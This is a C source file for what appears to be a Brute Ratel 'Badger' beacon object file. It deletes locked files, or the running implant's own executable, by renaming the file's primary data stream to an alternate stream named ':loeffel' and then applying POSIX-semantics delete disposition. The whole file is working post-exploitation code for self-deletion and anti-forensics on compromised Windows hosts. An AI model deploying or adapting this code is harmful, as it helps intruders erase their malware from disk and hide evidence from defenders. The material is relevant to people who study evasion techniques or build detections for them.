#include "definitions.h"
#include "badger_exports.h"

#define DS_STREAM_RENAME L":loeffel"

static void* ds_rename_handle(HANDLE hHandle) {
	LPCWSTR lpwStream = DS_STREAM_RENAME;

    size_t szStreamLen = BadgerWcslen((PWCHAR)lpwStream);

	PFILE_RENAME_INFO pfRename = (PFILE_RENAME_INFO)BadgerAlloc(sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * szStreamLen); // FILE_RENAME_INFO contains space for 1 WCHAR without NULL-byte
	if(pfRename == NULL){
		BadgerDispatch(g_dispatch, "[-] Could not allocate memory\n");
		return NULL;
	}

	BadgerMemset(pfRename, 0, sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * szStreamLen);

	// set our FileNameLength and FileName to DS_STREAM_RENAME
	pfRename->FileNameLength = (DWORD)(sizeof(WCHAR) * szStreamLen);
	BadgerMemcpy(pfRename->FileName, lpwStream, sizeof(WCHAR) * (szStreamLen + 1));

	BOOL fRenameOk = KERNEL32$SetFileInformationByHandle(hHandle, FileRenameInfo, pfRename, (DWORD)(sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * szStreamLen));
	if(!fRenameOk){
        BadgerDispatch(g_dispatch, "[-] SetFileInformationByHandle failed\n");
		BadgerFree((PVOID*)&pfRename);
		return NULL;
	}
	return pfRename;
}


static BOOL ds_deposite_handle(HANDLE hHandle) {
	// Ref: https://cybersecuritynews.com/windows-11-24h2-disrupts-self-delete/
	FILE_DISPOSITION_INFO_EX fDeleteEx;
	BadgerMemset(&fDeleteEx, 0, sizeof(fDeleteEx));

	fDeleteEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;

	return KERNEL32$SetFileInformationByHandle(hHandle, FileDispositionInfo, &fDeleteEx, sizeof(fDeleteEx));
}


void printHelp(){
	BadgerDispatch(g_dispatch, "[*] Usage: delete_locked.o <filepath>\n");
	BadgerDispatch(g_dispatch, "[*] <filepath>    Path to the locked file or 'self' for own process file\n");
}


void coffee( char ** argv, int argc, WCHAR** dispatch) {
	LPSTR pszFilePath;
    g_dispatch = dispatch;

	// Help check
	for (int i = 0; i < argc; i++) {
		if(BadgerStrcmp(argv[i], "-h") == 0){
			printHelp();
			return;
		}
	}

    if(argc < 1) {
		printHelp();
        return;
	}

    pszFilePath = argv[0];

	WCHAR wcPath[MAX_PATH + 1] = {0};

    if(BadgerStrcmp(pszFilePath, "self") == 0){
        if (KERNEL32$GetModuleFileNameW(NULL, wcPath, MAX_PATH) == 0) {
            BadgerDispatch(g_dispatch, "[-] Failed to get the current module handle\n");
            return;
        }
    } else {
        if (KERNEL32$MultiByteToWideChar(CP_ACP, 0, pszFilePath, -1, wcPath, MAX_PATH + 1) == 0) {
            BadgerDispatch(g_dispatch, "[-] MultiByteToWideChar failed\n");
            return;
        }
    }

    BadgerDispatchW(g_dispatch, L"[*] File: %s\n", wcPath);

	// get the path to the current running process ctx
	HANDLE hCurrent = KERNEL32$CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hCurrent == INVALID_HANDLE_VALUE){
		BadgerDispatch(g_dispatch, "[-] Failed to acquire handle of file\n");
		return;
	}

	// rename the associated HANDLE's file name
	BadgerDispatch(g_dispatch, "[*] Attempting to rename file name\n");
	void *pfRename = ds_rename_handle(hCurrent);
	if (pfRename == NULL) {
		BadgerDispatch(g_dispatch, "[-] Failed to rename to stream\n");
		return;
	}

	BadgerDispatch(g_dispatch, "[+] Successfully renamed file primary :$DATA ADS to specified stream\n");
	KERNEL32$CloseHandle(hCurrent);
	BadgerFree((PVOID*)&pfRename); // free memory allocated in ds_rename_handle
	pfRename = NULL;

	// open another handle, trigger deletion on close
	hCurrent = KERNEL32$CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hCurrent == INVALID_HANDLE_VALUE) {
		BadgerDispatch(g_dispatch, "[-] Failed to reopen current module\n");
		return;
	}

	if (!ds_deposite_handle(hCurrent)) {
		BadgerDispatch(g_dispatch, "[-] Failed to set delete deposition\n");
		return;
	}

	// trigger the deletion deposition on hCurrent
	BadgerDispatch(g_dispatch, "[*] Closing handle to trigger deletion deposition\n");
	KERNEL32$CloseHandle(hCurrent);

	// verify we've been deleted
	if (SHLWAPI$PathFileExistsW(wcPath)) {
		BadgerDispatch(g_dispatch, "[-] Failed to delete copy, file still exists\n");
		return;
	}

	BadgerDispatch(g_dispatch, "[+] Successfully deleted file from disk\n");
}
